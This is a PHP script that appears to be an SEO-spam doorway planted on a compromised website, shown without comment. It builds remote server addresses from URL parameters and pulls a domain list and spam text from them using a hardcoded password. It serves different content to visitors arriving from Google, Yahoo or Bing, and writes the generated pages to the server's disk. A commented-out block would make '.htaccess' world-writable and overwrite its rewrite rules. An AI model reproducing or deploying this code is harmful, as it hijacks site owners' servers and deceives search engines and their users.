<?php

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

$apass = "aodhfherkejkerjk";
/*
if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ rskpeauqp3tru.php?world=5&looping=135&hl=$1 [L]");
fclose($htout);
}
*/
foreach ($_GET as $a=>$b)
{
	$_GET["id"] = $b;
}

$x1=3;
$xx1=5;

$tpl = "xxx";
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = str_replace(" ", "+", $keyword);

$s = dirname($_SERVER['PHP_SELF']);
if ($s == '\\' | $s == '/') {$s = ('');}  
$s = $_SERVER['SERVER_NAME'] . $s;

$today = "20201126";

include("checkmob.php");
if(is_mobile() >0 ) $mobiledevice = 11;


if (file_exists("mydom.txt"))
{
if ((date("U")-filemtime("mydom.txt"))>900)
{
	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".181.21.126/mydom.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$mydom = curl_exec($ch); 
curl_close($ch);

if (strlen($mydom)<5) $mydom = file_get_contents("http://".$_GET["looping"].".181.21.126/mydom.txt"); 

	
	$file = fopen("mydom.txt", "w");
	fwrite($file, $mydom);
	fclose($file);
}
}
else
{
	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".181.21.126/mydom.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$mydom = curl_exec($ch); 
curl_close($ch);

if (strlen($mydom)<5) $mydom = file_get_contents("http://".$_GET["looping"].".181.21.126/mydom.txt"); 

	
	$file = fopen("mydom.txt", "w");
	fwrite($file, $mydom);
	fclose($file);
}


if ((strpos($_SERVER['HTTP_REFERER'], "google.")) OR (strpos($_SERVER['HTTP_REFERER'], "yahoo.")) OR (strpos($_SERVER['HTTP_REFERER'], "bing.")))
{
$mydom = file("mydom.txt");
$mydom = chop($mydom[0]);
$tpl = $_GET["id"].".php.tpl";
$tpl = file($tpl);
$tpl = chop($tpl[0]);
include("zqbdkxewvzoi");
exit;
}
else
{

	$myname = $_GET["id"].".php";
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
}	

	
//$num_temple = rand(1,9);

if (!file_exists("xyz.txt"))
{
	$file = fopen("xyz.txt", "w");
	fwrite($file, "1");
	fclose($file);
}

$tpl = file("xyz.txt");
$num_temple = chop($tpl[0]);
$newtpl = $num_temple + 1;
if ($newtpl == 6) $newtpl = 1;
$outtpl = fopen("xyz.txt", "w");
fwrite($outtpl, $newtpl);
fclose($outtpl);

$tpl = file("tpl$num_temple.html");
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = chop($keyword);
$keyword = ucfirst($keyword);

 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));
 $query_pars_2 = mb_strtolower($query_pars_2);

$text = "";

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".181.21.126/story2020.php?pass=$apass&q=$_GET[id]"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$text = curl_exec($ch); 
curl_close($ch);

if (strlen($text)<5000) $text = file_get_contents("http://".$_GET["looping"].".181.21.126/story2020.php?pass=$apass&q=$_GET[id]"); 


		$zzzzz = $_GET["world"] + 171;
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$zzzzz.31.253.227/cakes/page.php"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$text2 = curl_exec($ch); 
curl_close($ch);		
		
		$text = $text."<br><br>\n\n\n\n".$text2;	
     	$html = implode ("\n", $tpl);
		$html = str_replace("{keyword}", $keyword, $html);
		$html = str_replace("{manytext_bing}", $text, $html);
		
		if (strlen($text)>5000)
		{
		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);
		
		$out = fopen($myname.".tpl", "w");
		fwrite($out, $num_temple);
		fclose($out);
		}
        else exit;
		
		echo $html;
		



